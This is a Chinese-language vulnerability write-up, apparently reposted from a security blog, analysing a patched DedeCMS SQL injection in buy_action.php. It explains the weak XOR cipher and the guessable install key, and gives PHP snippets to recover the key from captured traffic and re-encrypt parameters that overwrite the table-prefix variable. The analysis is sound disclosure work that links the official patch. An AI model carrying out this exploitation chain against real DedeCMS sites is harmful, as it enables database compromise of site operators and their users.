# DedeCMS最新通杀注入(buy_action.php)漏洞分析

0x00 前言
-------

* * *

前两天，乌云白帽子提交了两个DedeCMS的通杀注入漏洞，闹得沸沸扬扬，25号织梦官方发布了补丁，于是就下载最新代码回来做了对比，这里简单的分析下其中的一个注入。

0x01 漏洞分析
---------

* * *

对比补丁后发现，25号发布的源码修改了5个文件，其中的/member/buy_action.php文件补丁对比如图1。

![enter image description here](http://drops.javaweb.org/uploads/images/4f06bfd39fd6982012c88ac42a26c209d727b7cb.jpg)

很明显mchStrCode函数加强了加密强度，补丁前是简单的异或算法，但是织梦25号发布的补丁旨在修复乌云提交的两个注入，这个函数可能有猫腻，搜索调用该函数的文件，如图2。

![enter image description here](http://drops.javaweb.org/uploads/images/0361b41db26d5128c0739142a8ad0ee569fce721.jpg)

接着看到/member/buy_action.php的22 - 40行代码：

```
if(isset($pd_encode) && isset($pd_verify) && md5("payment".$pd_encode.$cfg_cookie_encode) == $pd_verify)
{
    parse_str(mchStrCode($pd_encode,'DECODE'),$mch_Post);
    foreach($mch_Post as $k => $v) $$k = $v;
    $row  = $dsql->GetOne("SELECT * FROM #@__member_operation WHERE mid='$mid' And sta=0 AND product='$product'");
    if(!isset($row['buyid']))
    {
        ShowMsg("请不要重复提交表单!", 'javascript:;');
        exit();
    }
    if(!isset($paytype))
    {
        ShowMsg("请选择支付方式!", 'javascript:;');
        exit(); 
    }
    $buyid = $row['buyid'];

}else{

```

注意其中的这两行代码：

```
parse_str(mchStrCode($pd_encode,'DECODE'),$mch_Post);
    foreach($mch_Post as $k => $v) $$k = $v;

```

调用了mchStrCode函数对$pd_encode变量解密并通过parse_str函数注册变量，紧接着foreach遍历$mch_Post数组，这里如果我们可以控制$pd_encode解码后的内容，就可以注册覆盖任意变量。回过头来看mchStrCode函数的代码：

```
function mchStrCode($string,$action='ENCODE')
{
    $key    = substr(md5($_SERVER["HTTP_USER_AGENT"].$GLOBALS['cfg_cookie_encode']),8,18);
    $string    = $action == 'ENCODE' ? $string : base64_decode($string);
    $len    = strlen($key);
    $code    = '';
    for($i=0; $i<strlen($string); $i++)
    {
        $k        = $i % $len;
        $code  .= $string[$i] ^ $key[$k];
    }
    $code = $action == 'DECODE' ? $code : base64_encode($code);
    return $code;
}

```

看到mchStrCode函数中的这句代码：

```
$key = substr(md5($_SERVER["HTTP_USER_AGENT"].$GLOBALS['cfg_cookie_encode']),8,18);

```

`$_SERVER["HTTP_USER_AGENT"]+$GLOBALS['cfg_cookie_encode']`经过md5取18位字符，其中的`$_SERVER["HTTP_USER_AGENT"]`是浏览器的USER_AGENT，我们可控，关键是这个`$GLOBALS['cfg_cookie_encode']`的来源，我们继续对比补丁，如图3。

![enter image description here](http://drops.javaweb.org/uploads/images/3a4f3b595dc5ac4dd90a54e46c20a45793d973eb.jpg)

其中/install/index.php的$rnd_cookieEncode字符串的生成同样是加强了强度，$rnd_cookieEncode字符串最终也就是前面提到的`$GLOBALS['cfg_cookie_encode']`，我们看看补丁前的代码：

```
$rnd_cookieEncode = chr(mt_rand(ord('A'),ord('Z'))).chr(mt_rand(ord('a'),ord('z'))).chr(mt_rand(ord('A'),ord('Z'))).chr(mt_rand(ord('A'),ord('Z'))).chr(mt_rand(ord('a'),ord('z'))).mt_rand(1000,9999).chr(mt_rand(ord('A'),ord('Z')));

```

这段代码生成的加密密匙很有规律，所有密匙数为26^6*(9999-1000)=2779933068224,把所有可能的组合生成字典，用passwordpro暴力跑MD5或者使用GPU来破解，破解出md5过的密匙也花不了多少时间。 分析到此，现在的关键是如何得到经过MD5加密后的18位长度密匙。前面说过，mchStrCode函数使用简单的异或算法，假设有明文A，密匙B，密文C,则：

```
C = A ^ B
B = A ^ C

```

也就是说ABC只要只其二就可以推导出剩下的一个了。怎么得到明文以及加密后的字符串呢？看到/member/buy_action.php的112 - 114行代码：

```
$pr_encode = '';
    foreach($_REQUEST as $key => $val)
    {
        $pr_encode .= $pr_encode ? "&$key=$val" : "$key=$val";
    }

    $pr_encode = str_replace('=', '', mchStrCode($pr_encode));

    $pr_verify = md5("payment".$pr_encode.$cfg_cookie_encode);

    $tpl = new DedeTemplate();
    $tpl->LoadTemplate(DEDEMEMBER.'/templets/buy_action_payment.htm');
    $tpl->Display();

```

注意到$pr_encode是从$_REQUEST获取的，也就是说明文可控，同时$pr_encode加密后写到html页面，如图4。

![enter image description here](http://drops.javaweb.org/uploads/images/55a15a2266e59a76180a5bcf16001e942842d556.jpg)

0x02 漏洞测试
---------

* * *

下面来测试，这里需要用到firefox的一个插件User Agent Switcher来设置UA,安装插件后，添加一个UA头，其中的User Agent清空，description随便填。确认保存并使用插件将浏览器的UA设置刚刚添加的UA头，即为空。如图5。

![enter image description here](http://drops.javaweb.org/uploads/images/b5b8f2b1f130c610be2e3bbe3c7f17a079818c33.jpg)

设置为空是因为mchStrCode函数中的密匙含`$_SERVER["HTTP_USER_AGENT"]`，如果不为空将加大md5的破解难度，设置为空则密匙为固定10位长度。设置好UA后，注册并登陆会员中心，在“我的织梦”->“消费中心”->“会员升级/点卡充值”中的“购买新点卡”选择“100点卡”，在点击购买前使用Live HTTP header监听，抓到的数据包如图6。

![enter image description here](http://drops.javaweb.org/uploads/images/0e88e18fe8b9165351cf65d9df6fadb102206817.jpg)

因为$_REQUEST获取参数是从$_GET->$_POST->$_COOKIE依次获取，所以$pr_encode明文的的内容为POST的内容“product=card&pid=1”加上COOKIE的内容，然后加密并打印加密后的字符串到html页面。同时“product=card&pid=1”刚好18个字符长度，对应密匙长度。点击购买后支付方式选支付宝，再次使用使用Live HTTP header监听，点击购买并支付提交，抓到的数据包如图7。

![enter image description here](http://drops.javaweb.org/uploads/images/51fa57c76cfa86200db292ba79f04436b2635500.jpg)

将pd_encode=后面的字符串复制下来，利用下面的代码逆出MD5加密后的key：

```
<?php
$key = "product=card&pid=1";
$string = "QEJXUxNTQwlVABcGF0QMVAwFFmBwZzV1ZGd%2FJVhQQAIXWAMCBEZeBwAAUVJTAgoNA0BTBgdWBhZ8UgJVYkdTEywmDAxDdFRQVWVLUhR5c2tpAg4vVQFYVFQHBAVZUV5VBVEGAFdQBRIhVVVRfF9fXghkXllTXFRRCAdRAAUDBQUecwNUUnhZBgwMZV0IVW5rU1t1U1MNVVIOWFFRA1UEAwcEUQZaBUB1eWJpJiogcHcub2RmfA0XUwNUUldbEkoPVFkHVUMbX0BdRQdEXltYTxUKQQ";//加密的pd_encode字符串，需要修改
$string = base64_decode(urldecode($string));
for($i=0; $i<strlen($string); $i++)
{
        $code  .= $string[$i] ^ $key[$i];
}
echo "md5(\$key):" .$code;
?>

```

![enter image description here](http://drops.javaweb.org/uploads/images/767dc4dfb26e7447c33a4fa74ec350deccbbd618.jpg)

如图8。取逆出的key的前16位破解md5即可，破解出密匙后就可以利用mchStrCode函数来加密参数，同时利用变量覆盖漏洞覆盖$GLOBALS[cfg_dbprefix]实现注入。这里给出一段POC，代码如下：

```
<?php
$GLOBALS['cfg_cookie_encode'] = 'CaQIm1790O';
function mchStrCode($string,$action='ENCODE')
{
    $key    = substr(md5($GLOBALS['cfg_cookie_encode']),8,18);
    $string    = $action == 'ENCODE' ? $string : base64_decode($string);
    $len    = strlen($key);
    $code    = '';
    for($i=0; $i<strlen($string); $i++)
    {
        $k        = $i % $len;
        $code  .= $string[$i] ^ $key[$k];
    }
    $code = $action == 'DECODE' ? $code : base64_encode($code);
    return $code;
}

```

其中的CaQIm1790O就是解密出来的密匙，漏洞分析到处结束，感觉像是在记流水账，将就看看吧，最后上个本地测试EXP的图。如图9。

![enter image description here](http://drops.javaweb.org/uploads/images/621b417f9f8ddb2f77e5c9d8b79b0b63a614e33d.jpg)

0x03 总结
-------

* * *

写到这里就算结束了，最后做个总结，漏洞由mchStrCode函数弱算法->导致通过获取到的明文和密文可以逆出经过MD5加密的密匙->破解MD5得到密匙->利用密匙加密数据->经过parse_str函数和foreach遍历最终覆盖表前缀变量$GLOBALS[cfg_dbprefix]实现注入，这样的漏洞并不多见，但危害很大，WAF等防火墙很难防御，漏洞利用过程提交的数据因为加密，面目全非,和正常用户操作提交的数据并无二致。

附：官方补丁地址：[http://www.dedecms.com/pl/](http://www.dedecms.com/pl/)

原文链接：[http://loudong.360.cn/blog/view/id/16](http://loudong.360.cn/blog/view/id/16)